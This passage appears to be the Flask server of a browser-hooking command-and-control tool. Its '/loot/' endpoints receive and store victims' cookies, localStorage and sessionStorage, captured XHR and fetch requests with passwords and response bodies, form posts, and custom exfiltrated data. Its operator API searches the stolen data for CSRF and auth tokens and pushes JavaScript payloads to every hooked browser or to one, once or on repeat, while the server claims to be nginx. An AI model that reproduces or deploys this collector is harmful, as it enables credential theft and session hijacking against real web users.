    eventType='USERINPUT', eventID=newInput.id)
    db_session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record whatever cookies we can get our hands on
# Note that any httpOnly flagged cookies we won't get
# which would probably include any session cookies. Probably. 
@app.route('/loot/dessert/<identifier>', methods=['POST'])
def recordCookie(identifier):
    # logger.info("New cookie recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401

    lootDir = findLootDirectory(identifier)
    content = request.json
    cookieName = content['cookieName']
    cookieValue = content['cookieValue']
    # logger.info("Cookie name: " + content['cookieName'] + ", value: " + content['cookieValue'])


    # Put it in the DB
    newCookie = Cookie(clientID=identifier, cookieName=cookieName, cookieValue=cookieValue)
    db_session.add(newCookie)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db_session.refresh(newCookie)
    newEvent = Event(clientID=identifier, timeStamp=newCookie.timeStamp, 
    eventType='COOKIE', eventID=newCookie.id)
    db_session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record local storage data bits
@app.route('/loot/localstore/<identifier>', methods=['POST'])
def recordLocalStorageEntry(identifier):
    # logger.info("New localStorage data recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401


    lootDir = findLootDirectory(identifier)
    content = request.json
    localStorageKey = content['key']
    localStorageValue = content['value']


    # Put it in the DB
    newLocalStorage = LocalStorage(clientID=identifier, key=localStorageKey, value=localStorageValue)
    db_session.add(newLocalStorage)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db_session.refresh(newLocalStorage)
    newEvent = Event(clientID=identifier, timeStamp=newLocalStorage.timeStamp, 
    eventType='LOCALSTORAGE', eventID=newLocalStorage.id)
    db_session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record session storage data bits
@app.route('/loot/sessionstore/<identifier>', methods=['POST'])
def recordSessionStorageEntry(identifier):
    # logger.info("New sessionStorage data recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401
 
    lootDir = findLootDirectory(identifier)
    content = request.json 
    sessionStorageKey   = content['key']
    sessionStorageValue = content['value']

    # Put it in the DB
    newSessionStorage = SessionStorage(clientID=identifier, key=sessionStorageKey, value=sessionStorageValue)
    db_session.add(newSessionStorage)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()


    # add to global event table
    db_session.refresh(newSessionStorage)
    newEvent  = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp, 
    eventType ='SESSIONSTORAGE', eventID=newSessionStorage.id)
    db_session.add(newEvent)
    dbCommit()    

    return "ok", 200





# Dump the full XHR api call info
@app.route('/loot/xhrRequest/<identifier>', methods=['POST'])
def recordXhrDump(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    content        = request.json
    method         = content.get('method')
    url            = content.get('url')
    asyncRequest   = content.get('async', True)
    requestBody    = content.get('body')
    user           = content.get('user')
    password       = content.get('password')
    headers        = content.get('headers', {})
    responseBody   = content.get('responseBody')
    responseStatus = content.get('responseStatus')

    newXhrApiCall = XhrApiCall(clientID=identifier, method=method, url=url, asyncRequest=asyncRequest, user=user, password=password, requestBody=requestBody, responseBody=responseBody, responseStatus=responseStatus)
    db_session.add(newXhrApiCall)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db_session.refresh(newXhrApiCall)
    newEvent  = Event(clientID=identifier, timeStamp=newXhrApiCall.timeStamp, 
    eventType ='XHRAPICALL', eventID=newXhrApiCall.id)
    db_session.add(newEvent)

    for header, value in headers.items():
        newHeader = XhrHeader(apiCallID=newXhrApiCall.id, clientID=identifier, header=header, value=value)
        db_session.add(newHeader)

    dbCommit()    

    return "ok", 200   



# Dump the full Fetch api call info
@app.route('/loot/fetchRequest/<identifier>', methods=['POST'])
def recordFetchDump(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    content        = request.json
    method         = content.get('method')
    url            = content.get('url')
    requestBody    = content.get('body')
    headers        = content.get('headers', {})
    responseBody   = content.get('responseBody')
    responseStatus = content.get('responseStatus')

    newFetchApiCall = FetchApiCall(clientID=identifier, method=method, url=url, requestBody=requestBody, responseBody=responseBody, responseStatus=responseStatus)
    db_session.add(newFetchApiCall)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db_session.refresh(newFetchApiCall)
    newEvent  = Event(clientID=identifier, timeStamp=newFetchApiCall.timeStamp, 
    eventType ='FETCHAPICALL', eventID=newFetchApiCall.id)
    db_session.add(newEvent)

    for header, value in headers.items():
        newHeader = FetchHeader(apiCallID=newFetchApiCall.id, clientID=identifier, header=header, value=value)
        db_session.add(newHeader)

    dbCommit()    

    return "ok", 200   




# Record Form Posts
@app.route('/loot/formPost/<identifier>', methods=['POST'])
def recordFormPost(identifier):

    if not isClientSessionValid(identifier):
        return "No.", 401

    # logger.info("## Recording Form Post")
    content     = request.json

    formName    = content.get('name', None)
    formAction  = content.get('action', None)  # This may be base64 encoded
    formMethod  = content.get('method', None)
    formEncType = content.get('encType', None)
    formData    = content.get('data', None)   # Make sure this comes in base64 encoded
    url         = content.get('url', None)

    # Put it in the database
    newFormPost = FormPost(clientID=identifier, formName=formName, formAction=formAction, formMethod=formMethod, formEncType=formEncType, formData=formData, url=url)
    db_session.add(newFormPost)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db_session.refresh(newFormPost)
    newEvent  = Event(clientID=identifier, timeStamp=newFormPost.timeStamp, 
    eventType ='FORMPOST', eventID=newFormPost.id)
    db_session.add(newEvent)
    dbCommit()    

    return "ok", 200




# Record custom exfiltration, allows custom payloads
# to send responses into client events for storage
@app.route('/loot/customData/<identifier>', methods=['POST'])
def recordCustomExfil(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    content = request.json

    note = content.get('note', None)
    data = content.get('data', None)

    newExfil = CustomExfil(note=note, data=data)
    db_session.add(newExfil)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db_session.refresh(newExfil)
    newEvent  = Event(clientID=identifier, timeStamp=newExfil.timeStamp, 
    eventType ='CUSTOMEXFIL', eventID=newExfil.id)
    db_session.add(newEvent)
    dbCommit()    

    return "ok", 200






#***************************************************************************
# UI API Endpoints


# Get clients list
@app.route('/api/getClients', methods=['GET'])
@login_required
def getClients():
    clients = Client.query.all()

    allClients = [{'id':escape(client.id), 'tag':escape(client.tag), 'nickname':escape(client.nickname), 'notes':escape(client.notes), 
        'firstSeen':client.firstSeen, 'lastSeen':client.lastSeen, 'ip':escape(client.ipAddress),
        'platform':escape(client.platform), 'browser':escape(client.browser), 'isStarred':client.isStarred, 'hasJobs':client.hasJobs} for client in clients]

    return jsonify(allClients)




@app.route('/api/clientEvents/<id>', methods=['GET'])
@login_required
def getClientEvents(id):
    # logger.info("Retrieving events table for client: " + id)
    client = Client.query.filter_by(id=id).first()
    clientUUID = client.uuid;

    events = Event.query.filter_by(clientID=clientUUID)

    eventData = [{'id':escape(event.id), 'timeStamp':event.timeStamp, 
        'eventType':escape(event.eventType), 'eventID':escape(event.eventID)} for event in events]

    return jsonify(eventData)

    

@app.route('/api/clientScreenshot/<key>', methods=['GET'])
@login_required
def getClientScreenshots(key):
    screenshot = Screenshot.query.filter_by(id=key).first()

    screenshotData = {'fileName':escape(screenshot.fileName)}
    

    return jsonify(screenshotData)



@app.route('/api/clientHtml/<key>', methods=['GET'])
@login_required
def getClientHtml(key):
    htmlCode = HtmlCode.query.filter_by(id=key).first()

    fileLocation = dataDirectory + htmlCode.fileName[2:]
    with open(fileLocation, 'r') as file:
        code = file.read()

    # This one shouldn't be escaped
    htmlData = {'url':htmlCode.url, 'code':code, 'fileName':htmlCode.fileName}
    

    return jsonify(htmlData)



@app.route('/api/clientUrl/<key>', methods=['GET'])
@login_required
def getClientUrls(key):
    urlsVisited = UrlVisited.query.filter_by(id=key).first()

    urlData = {'url':escape(urlsVisited.url)}
    

    return jsonify(urlData)



@app.route('/api/clientUserInput/<key>', methods=['GET'])
@login_required
def getClientUserInputs(key):
    userInput = UserInput.query.filter_by(id=key).first()

    userInputData = {'inputName':escape(userInput.inputName), 'inputValue':escape(userInput.inputValue)}
    

    return jsonify(userInputData)



@app.route('/api/clientCookie/<key>', methods=['GET'])
@login_required
def getClientCookies(key):
    # logger.info("*** In cookie lookup, key is: " + key)
    cookie = Cookie.query.filter_by(id=key).first()

    cookieData = {'cookieName':escape(cookie.cookieName), 'cookieValue':escape(cookie.cookieValue)}
    

    return jsonify(cookieData)





@app.route('/api/clientLocalStorage/<key>', methods=['GET'])
@login_required
def getClientLocalStorage(key):
    # logger.info("**** Fetching client local storage...")
    localStorage = LocalStorage.query.filter_by(id=key).first()
    # logger.info("Sending back: " + localStorage.key + ":" + localStorage.value)
    
    localStorageData = {'localStorageKey':escape(localStorage.key), 'localStorageValue':escape(localStorage.value)}
    

    return jsonify(localStorageData)




@app.route('/api/clientSessionStorage/<key>', methods=['GET'])
@login_required
def getClientSesssionStorage(key):
    sessionStorage = SessionStorage.query.filter_by(id=key).first()
    
    sessionStorageData = {'sessionStorageKey':escape(sessionStorage.key), 'sessionStorageValue':escape(sessionStorage.value)}
    

    return jsonify(sessionStorageData)


 


@app.route('/api/clientXhrApiCall/<key>', methods=['GET'])
@login_required
def getClientXhrApiCall(key):
    xhrApiCall = XhrApiCall.query.filter_by(id=key).first()
    xhrHeaders = XhrHeader.query.filter_by(apiCallID=key).all()

    headers_list = [{'header': header.header, 'value': header.value} for header in xhrHeaders]

    # for header in headers_list:
    #     print(f"---------Header: {header['header']}, Value: {header['value']}")


    xhrCallData = {
        'method': escape(xhrApiCall.method),
        'url': escape(xhrApiCall.url),
        'asyncRequest': escape(xhrApiCall.asyncRequest),
        'user': escape(xhrApiCall.user),
        'password': escape(xhrApiCall.password),
        'responseStatus': escape(xhrApiCall.responseStatus),
        'headers': headers_list
    }

    return jsonify(xhrCallData)





@app.route('/api/clientXhrCall/<key>', methods=['GET'])
@login_required
def getClientXhrCall(key):
    # logger.info("**** Fetching client xhr api call...")
    xhrCall = XhrApiCall.query.filter_by(id=key).first()

    xhrCallData = {'requestBody':xhrCall.requestBody, 'responseBody':xhrCall.responseBody}

    return jsonify(xhrCallData)






@app.route('/api/clientFetchApiCall/<key>', methods=['GET'])
@login_required
def getClientFetchApiCall(key):
    fetchApiCall = FetchApiCall.query.filter_by(id=key).first()
    fetchHeaders = FetchHeader.query.filter_by(apiCallID=key).all()

    headers_list = [{'header': header.header, 'value': header.value} for header in fetchHeaders]

    # for header in headers_list:
    #     print(f"---------Header: {header['header']}, Value: {header['value']}")


    fetchCallData = {
        'method': escape(fetchApiCall.method),
        'url': escape(fetchApiCall.url),
        'responseStatus': escape(fetchApiCall.responseStatus),
        'headers': headers_list
    }

    return jsonify(fetchCallData)




@app.route('/api/clientFetchCall/<key>', methods=['GET'])
@login_required
def getClientFetchCall(key):
    # logger.info("**** Fetching client xhr api call...")
    fetchCall = FetchApiCall.query.filter_by(id=key).first()

    fetchCallData = {'requestBody':fetchCall.requestBody, 'responseBody':fetchCall.responseBody}

    return jsonify(fetchCallData)



@app.route('/api/clientFormPosts/<key>', methods=['GET'])
@login_required
def getClientFormPost(key):
    #logger.info("*** Fetching client form post..")
    formPost = FormPost.query.filter_by(id=key).first()

    # formAction and data are base64 encoded at this point
    formPostData = {'name':escape(formPost.formName), 'action':formPost.formAction, 'method':escape(formPost.formMethod), 'data': formPost.formData, 'url':formPost.url}

    return jsonify(formPostData)



@app.route('/api/formCsrfTokenSearch/<key>', methods=['POST'])
@login_required
def searchCsrfToken(key):
    content    = request.json
    tokenName  = content['tokenName']
    tokenValue = content['tokenValue']

    formPost = FormPost.query.filter_by(id=key).first()

    clientID = formPost.clientID

    htmlLoot = HtmlCode.query.filter_by(clientID=clientID)

    foundToken = False
    for htmlCode in htmlLoot:
        print("Going to search file: " + htmlCode.fileName)
        with open(htmlCode.fileName, 'r', encoding='utf-8') as file:
            content = file.read()

            if (tokenValue in content):
                if (tokenName in content):
                    foundToken = True
                    print("Found to token in: " + htmlCode.fileName)
                    print("URL is: " + htmlCode.url)

                    break

    if foundToken:
        tokenFileData = {'url':escape(htmlCode.url), 'fileName':escape(htmlCode.fileName)}
    else:
        tokenFileData = {'url':'Not Found', 'fileName':'Not Found'}

    return jsonify(tokenFileData)




@app.route('/api/apiAuthTokenSearch/<key>', methods=['POST'])
@login_required
def searchApiAuthToken(key):
    content    = request.json
    apiType    = content['type']
    tokenValue = content['tokenValue']

    locationType = ""

    # Search cookies, local, session

    if apiType == 'XHR':
        apiCall = XhrApiCall.query.filter_by(id=key).first()
    elif apiType == 'FETCH':
        apiCall = FetchApiCall.query.filter_by(id=key).first()

    clientID = apiCall.clientID

    # Search all local storage, most likely spot
    localStorage = LocalStorage.query.filter_by(clientID=clientID, value=tokenValue).first()

    if localStorage is not None:
        locationType = "Local Storage"
        tokenName    = localStorage.key
    else:
        # It's not in local storage, check session storage
        sessionStorage = SessionStorage.query.filter_by(clientID=clientID, value=tokenValue).first()

        if sessionStorage is not None:
            locationType = "Session Storage"
            tokenName    = sessionStorage.key
        else:
            # Not there either, check cookies
            cookieStorage = Cookie.query.filter_by(clientID=clientID, cookieValue=tokenValue).first()

            if cookieStorage is not None:
                locationType = "Cookies"
                tokenName    = cookieStorage.cookieName
            else:
                locationType = "NOT FOUND"
                tokenName    = "NOT FOUND"

    print("*** At end of auth token search, was found in: " + locationType)

    locationData = {'location':locationType, 'tokenName':tokenName}

    return jsonify(locationData)







@app.route('/api/clientCustomExfilNote/<key>', methods=['GET'])
@login_required
def getClientCustomExfil(key):
    customExfil = CustomExfil.query.filter_by(id=key).first()

    # Note these are base64 encoded at this point, they'll need
    # to be escaped client side
    customExfilData = {'note':customExfil.note}

    return jsonify(customExfilData)



@app.route('/api/clientCustomExfilDetail/<key>', methods=['GET'])
@login_required
def getClientCustomExfilDetail(key):
    customExfil = CustomExfil.query.filter_by(id=key).first()

    # Note these are base64 encoded at this point, they'll need
    # to be escaped client side
    customExfilData = {'note':customExfil.note, 'data':customExfil.data}

    return jsonify(customExfilData)




@app.route('/api/updateClientNotes/<key>', methods=['POST'])
@login_required
def setClientNotes(key):
    content = request.json 
    newNote = content['note']
    client  = Client.query.filter_by(id=key).first()
   
    client.notes = newNote
    dbCommit()

    return "ok", 200



@app.route('/api/allClientNotes', methods=['GET'])
@login_required
def getAllClientNotes():
    clients = Client.query.all()
    allNoteData = [{'client':str(escape(client.nickname)), 'note':client.notes} for client in clients]

    return jsonify(allNoteData)


@app.route('/api/updateClientStar/<key>', methods=['POST'])
@login_required
def setClientStar(key):
    content   = request.json
    isStarred = content['isStarred']
    client    = Client.query.filter_by(id=key).first()
  
    client.isStarred = isStarred 
    dbCommit()

    return "ok", 200



@app.route('/api/app/allowNewClientSessions', methods=['GET'])
@login_required
def getAllowNewClientSessions():
    appSettings = AppSettings.query.filter_by(id=1).first()

    newSessionData = {'newSessionsAllowed':appSettings.allowNewSesssions}

    return jsonify(newSessionData)



@app.route('/api/app/setAllowNewClientSessions/<setting>', methods=['GET'])
@login_required
def setAllowNewClientSessions(setting):
    appSettings = AppSettings.query.filter_by(id=1).first()
   
    if (setting != '0' and setting != '1'):
        return "No.", 401
    elif setting == '1':
        appSettings.allowNewSesssions = True
    else:
        appSettings.allowNewSesssions = False

    dbCommit()

    return "ok", 200




@app.route('/api/app/clientRefreshRate', methods=['GET'])
@login_required
def getClientRefreshRate():
    appSettings = AppSettings.query.filter_by(id=1).first()

    refreshData = {'clientRefreshRate':appSettings.clientRefreshRate}

    return jsonify(refreshData)



@app.route('/api/app/setClientRefreshRate/<rate>', methods=['GET'])
@login_required
def setClientRefreshRate(rate):
    rate = int(rate)
    
    if rate < 1 or rate > 3600:
        return "No.", 401
    else:
        appSettings = AppSettings.query.filter_by(id=1).first()
        appSettings.clientRefreshRate = rate
        dbCommit()

        return "ok", 200




@app.route('/api/blockClientSession/<key>', methods=['GET'])
@login_required
def blockClientSession(key):
    client = Client.query.filter_by(id=key).first()
    client.sessionValid = False;
    dbCommit()

    return "ok", 200



@app.route('/api/getBlockedIPs', methods=['GET'])
@login_required
def getBlockedIPs():
    blockedIPs = BlockedIP.query.all()

    allBlockedIPs = [{'id':escape(blockedIP.id), 'ip':escape(blockedIP.ip)} for blockedIP in blockedIPs]

    return jsonify(allBlockedIPs)



@app.route('/api/blockIP', methods=['POST'])
@login_required
def blockIP(): 
    content = request.json
    ip      = content['ip']

    blockedIP = BlockedIP(ip=ip)
    db_session.add(blockedIP)
    dbCommit()

    return "ok", 200



@app.route('/api/deleteBlockedIP/<key>', methods=['GET'])
@login_required
def deleteBlockedIP(key):
    blockedIP = BlockedIP.query.filter_by(id=key).first()

    db_session.delete(blockedIP)
    dbCommit()

    return "ok", 200



@app.route('/api/getSavedPayloads', methods=['GET'])
@login_required
def getSavedCustomPayloads():
    savedPayloads = CustomPayload.query.all()

    allSavedPayloads = [{'id':escape(payload.id), 'name':escape(payload.name), 'autorun':payload.autorun, 'repeatrun':payload.repeatrun} for payload in savedPayloads]

    return jsonify(allSavedPayloads)





# Returns the payload list and whether that payload
# is enabled for autorun for the particular client key
@app.route('/api/getPayloadsForClient/<key>', methods=['GET'])
@login_required
def getPayloadsForClient(key):
    clientSavedPayloads = []
    savedPayloads = CustomPayload.query.all()

    repeatRunJobs = ClientPayloadJob.query.filter_by(clientKey=key).filter_by(repeatrun=True).all()

    for payload in savedPayloads:
        repeatRunFound = False
        
        for job in repeatRunJobs:
            if job.payloadKey == payload.id:
                repeatRunFound = True
                break

        payloadData = {
            'id':escape(payload.id),
            'name':escape(payload.name),
            'autorun':payload.autorun,
            'repeatrun':repeatRunFound
        }

        clientSavedPayloads.append(payloadData)


    return jsonify(clientSavedPayloads)





@app.route('/api/getSavedPayloadCode/<key>', methods=['GET'])
@login_required
def getSavedPayloadCode(key):
    payload = CustomPayload.query.filter_by(id=key).first()

    payloadData = {'name':escape(payload.name), 'description':escape(payload.description),'code':escape(payload.code)}

    return jsonify(payloadData)



@app.route('/api/getAllPayloads', methods=['GET'])
@login_required
def getAllSavedPayloads():
    payloads = CustomPayload.query.all()

    allPayloadsDump = [{'name':payload.name, 'description':payload.description, 'code':payload.code} for payload in payloads]

    return jsonify(allPayloadsDump)






@app.route('/api/setPayloadAutorun', methods=['POST'])
@login_required
def setPayloadAutorun():
    content = request.json
    name    = content['name']
    autorun = content['autorun']

    payload = CustomPayload.query.filter_by(name=name).first()
    
    payload.autorun = autorun

    dbCommit()

    return "ok", 200


@app.route('/api/runPayloadAllClients/<key>', methods=['GET'])
@login_required
def runPayloadAllClients(key):
    payload = CustomPayload.query.filter_by(id=key).first()

    clients = Client.query.all()

    for client in clients:
        if client.sessionValid:
            newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code)
            db_session.add(newJob)

    dbCommit()

    return "ok", 200



@app.route('/api/setPayloadRepeatRun', methods=['POST'])
@login_required
def repeatPayloadAllClients():
    content   = request.json
    name      = content['name']
    repeatrun = content['repeatrun']

    payload = CustomPayload.query.filter_by(name=name).first()
    
    payload.repeatrun = repeatrun

    # need to cancel individual client jobs
    if payload.repeatrun == False:
        clientJobs = ClientPayloadJob.query.filter_by(payloadKey=payload.id)

        for clientJob in clientJobs:
            db_session.delete(clientJob)


    dbCommit()

    return "ok", 200




@app.route('/api/singleClientPayloadRepeatRun', methods=['POST'])
@login_required
def repeatPayloadSingleClient():
    content   = request.json
    name      = content['name']
    clientID  = content['clientID']
    repeatrun = content['repeatrun']

    payload = CustomPayload.query.filter_by(name=name).first()
    

    if repeatrun:
        # Turn it on
        newJob = ClientPayloadJob(clientKey=clientID, payloadKey=payload.id, code=payload.code, repeatrun=True)
        db_session.add(newJob)
    else:
        # Turn it off
        currentClientPayloads = (ClientPayloadJob.query
        .filter_by(clientKey=clientID)
        .filter_by(payloadKey=payload.id)
        .filter_by(repeatrun=True))

        for clientPayload in currentClientPayloads:
            clientPayload.repeatrun = False 

    dbCommit()

    return "ok", 200



@app.route('/api/runPayloadSingleClient', methods=['POST'])
@login_required
def runPayloadSingleClient():
    content = request.json 

    payloadKey = content['payloadKey']
    clientKey  = content['clientKey']

    payload = CustomPayload.query.filter_by(id=payloadKey).first()

    # testing just for the print
    # client = Client.query.filter_by(id=clientKey).first()

    # logger.info("Running single client payload:")
    # logger.info("Client: " + client.nickname)
    # logger.info("Code: " + payload.code)

    newJob = ClientPayloadJob(clientKey=clientKey, payloadKey=payloadKey, code=payload.code)
    db_session.add(newJob)
    dbCommit()

    return "ok", 200



@app.route('/api/clearAllPayloadJobs', methods=['GET'])
@login_required
def clearAllPayloadJobs():
    # logger.info("Clearing all client payload jobs...")
    db_session.query(ClientPayloadJob).delete()

    CustomPayloads = CustomPayload.query.filter_by(autorun=True)

    for payload in CustomPayloads:
        payload.autorun=False 

    CustomPayloads = CustomPayload.query.filter_by(repeatrun=True)

    for payload in CustomPayloads:
        payload.repeatrun=False 

    dbCommit()

    return "ok", 200
   


@app.route('/api/savePayload', methods=['POST'])
@login_required
def saveCustomPayload():
    content        = request.json 

    name           = content['name']
    newDescription = content['description']
    newCode        = content['code']

    # Check if this is an existing payload we're just updating
    payload = CustomPayload.query.filter_by(name=name).first()

    if payload is not None:
        payload.description = newDescription
        payload.code        = newCode
    else:
        newPayload = CustomPayload(name=name, description=newDescription, code=newCode)
        db_session.add(newPayload)

    dbCommit()

    return "ok", 200



@app.route('/api/savePayloads', methods=['POST'])
@login_required
def saveCustomPayloads():
    contents        = request.json 

    for content in contents:
        name           = content['name']
        newDescription = content['description']
        newCode        = content['code']

        # Check if this is an existing payload we're just updating
        payload = CustomPayload.query.filter_by(name=name).first()

        if payload is not None:
            payload.description = newDescription
            payload.code        = newCode
        else:
            newPayload = CustomPayload(name=name, description=newDescription, code=newCode)
            db_session.add(newPayload)

    dbCommit()

    return "ok", 200




@app.route('/api/deletePayload/<key>', methods=['GET'])
@login_required
def deleteCustomPayload(key):
    payload = CustomPayload.query.filter_by(id=key).first()
    db_session.delete(payload)
    dbCommit()

    return "ok", 200

#**************************************************************************



if __name__ == '__main__':
    # printHeader()

    logger.info("Python main running....")

    # Response configuration
    WSGIRequestHandler.protocol_version = "HTTP/1.1"
    WSGIRequestHandler.server_version   = "nginx"
    WSGIRequestHandler.sys_version      = ""

    # If proxy mode we run HTTP and accept the proxy headers from nginx
    # If not proxy mode we'll run self-signed cert for testing
    if (proxyMode):
        app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
        app.run(debug=False, host='0.0.0.0', port=8444)
    else:
        app.run(debug=False, host='0.0.0.0', port=8444, ssl_context='adhoc')
       


